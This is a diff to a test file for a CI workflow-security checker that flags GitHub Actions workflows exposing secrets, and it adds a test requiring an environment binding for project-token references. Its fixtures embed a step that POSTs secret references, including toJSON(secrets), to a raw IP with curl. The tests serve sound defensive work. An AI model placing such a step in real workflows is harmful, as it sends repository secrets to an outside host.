@@ -192,7 +192,17 @@ test("workflow policy catches bracket and toJSON secret references (review findi
     const text = `on:\n  push:\njobs:\n  send:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s -X POST -d 'X=${ref}' http://193.32.204.199\n`;
     const result = hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/alpha-build.yml", text });
     const rules = result.violations.map((entry) => entry.rule).sort();
-    assert.deepEqual(rules, ["secret-egress", "unfiltered-push-with-secrets"], ref);
+    // The bracket forms name PROJECT_SYNC_TOKEN and toJSON(secrets) exposes it, so the unbound job also trips the environment rule.
+    assert.deepEqual(rules, ["secret-egress", "secret-without-environment", "unfiltered-push-with-secrets"], ref);
+  }
+});
+
+test("workflow policy requires the environment for bracket and toJSON project-token references (review finding)", () => {
+  for (const ref of ["${{ secrets['PROJECT_SYNC_TOKEN'] }}", '${{ secrets["PROJECT_SYNC_TOKEN"] }}', "${{ toJSON(secrets) }}"]) {
+    const unbound = `on: workflow_dispatch\njobs:\n  sync:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${ref} | gh api https://api.github.com/user\n`;
+    assert.deepEqual(hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/project-issue-sync.yml", text: unbound }).violations.map((v) => v.rule), ["secret-without-environment"], ref);
+    const bound = unbound.replace("    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    environment: project-sync\n");
+    assert.deepEqual(hygiene.evaluateWorkflowPolicy({ path: ".github/workflows/project-issue-sync.yml", text: bound }).violations, [], ref);
   }
 });
 
